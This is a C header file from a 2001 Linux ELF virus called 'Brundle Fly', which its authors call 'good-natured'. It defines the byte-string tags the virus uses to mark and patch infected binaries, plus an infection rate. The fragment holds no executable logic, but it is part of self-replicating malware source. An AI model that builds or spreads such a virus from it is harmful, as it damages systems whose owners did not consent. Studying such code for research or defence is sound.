/*
 * Brundle Fly - Good-natured Linux ELF virus supporting kernel 2.2 and 2.4
 * Copyright 2001 Konrad Rieck <kr@roqe.org>, Konrad Kretschmer <kk@roqe.org>
 * In memory to Seth Brundle 
 *
 * Some useful definitions. Note that we are operating on Intel, this is 
 * little endian crap. 
 *
 * $Id: brundle-fly.h,v 1.7 2001/07/11 18:34:48 kr Exp $
 */

#define PAGE_SIZE 4096
#define VIRUS_A_START     "\xca\xfa\xca\xfa"
#define VIRUS_ENTRY_TAG   "\x2d\xfe\xaf\xfe\xaf"
#define HOST_ENTRY_TAG    "\xef\xbe\xad\xde"
#define LENGTH_A_TAG      "\xfa\xbe\xfa\xbe"
#define HOST_A_TAG        "\xed\xfe\xed\xfe"
#define VIRUS_A_TAG       "\xcd\xab\xcd\xab"
#define VIRUS_A_OFF_TAG   "\xab\xfa\xab\xfa"
#define INFECTION_RATE    3
